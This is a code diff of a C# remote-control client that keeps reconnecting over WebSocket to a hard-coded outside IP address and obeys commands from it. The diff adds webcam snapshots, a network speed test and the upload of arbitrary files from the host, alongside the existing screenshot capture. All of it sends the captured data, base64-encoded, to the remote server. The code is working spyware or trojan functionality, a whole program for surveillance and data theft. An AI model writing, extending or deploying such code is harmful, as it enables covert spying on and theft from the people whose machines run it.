@@ -6,13 +6,15 @@ using System.Drawing;
 using System.IO;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
+using Emgu.CV;
+
 namespace A3
 {
     class Program
     {
         static void Main(string[] args)
         {
-            using (var ws = new WebSocket("ws://araulin.me:4422"))
+            using (var ws = new WebSocket("ws://154.49.211.230:4422"))
             {
                 ws.OnMessage += (sender, e) =>
                 {
@@ -20,7 +22,7 @@ namespace A3
                     message = e.Data;
                     if (message == "screenshot")
                     {
-                        ws.Send("Please wait, generating screenshot...");
+                        ws.Send("##MESSAGE##{\"type\":\"info\", \"message\":\"Please wait, generating screenshot...\"}");
                         Bitmap memoryImage;
                         memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                         Screen.PrimaryScreen.Bounds.Height);
@@ -32,10 +34,45 @@ namespace A3
                         memoryImage.Save(stream, ImageFormat.Bmp);
                         byte[] imageBytes = stream.ToArray();
                         string base64String = Convert.ToBase64String(imageBytes);
-                        ws.Send("uploading screenshot (may exceed 10mo, please be patient)...");
-                        ws.Send("##SCREENSHOT##");
-                        ws.Send(base64String);
+                        ws.Send("##SCREENSHOT##"+ base64String);
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }
+                    else if(message == "webcam_snap")
+                    {
+                        VideoCapture capture = new VideoCapture();
+                        Bitmap image = capture.QueryFrame().Bitmap;
+                        MemoryStream ms = new MemoryStream();
+                        image.Save(ms, ImageFormat.Jpeg);
+                        byte[] byteImage = ms.ToArray();
+                        var SigBase64 = Convert.ToBase64String(byteImage);
+                        ws.Send("##WEBCAM_SNAP##"+SigBase64);
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }else if(message == "speedtest")
+                    {
+                        const string tempfile = "tempfile.tmp";
+                        System.Net.WebClient webClient = new System.Net.WebClient();
+                        Stopwatch sww = Stopwatch.StartNew();
+                        webClient.DownloadFile("http://www.ovh.net/files/100Mio.dat", tempfile);
+                        sww.Stop();
+
+                        FileInfo fileInfo = new FileInfo(tempfile);
+                        long speed = fileInfo.Length / sww.Elapsed.Milliseconds / 1000;
+                        string jj = "{\"duration\":\""+ sww.Elapsed.Milliseconds+"\",\"file_size\":\""+ fileInfo.Length.ToString("N0")+"\",\"speed\":\""+ speed.ToString("N0")+"\"}";
+                        ws.Send("##SPEEDTEST##" + jj);
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }
+                    else if(message.StartsWith("upload_file"))
+                    {   
+                        string filepath = message.Replace("upload_file ","");
+                        if (System.IO.File.Exists(filepath)){
+                            FileInfo info = new FileInfo(filepath);
+                            ws.Send("##FILENAME##" + filepath);
+                            ws.Send(info);
+                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        }else{
+                            ws.Send("##MESSAGE##{\"type\":\"error\", \"message\":\"Error, file does not exists !\"}");
+                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        }
                     }
                     else
                     {
@@ -60,7 +97,7 @@ namespace A3
                     sw.Start();
                     while (true)
                     {
-                        if(sw.ElapsedMilliseconds > 10000)
+                        if(sw.ElapsedMilliseconds > 2000)
                         {
                             ws.Connect();
                             ws.Send("hello ##" + Environment.CurrentDirectory + "##");
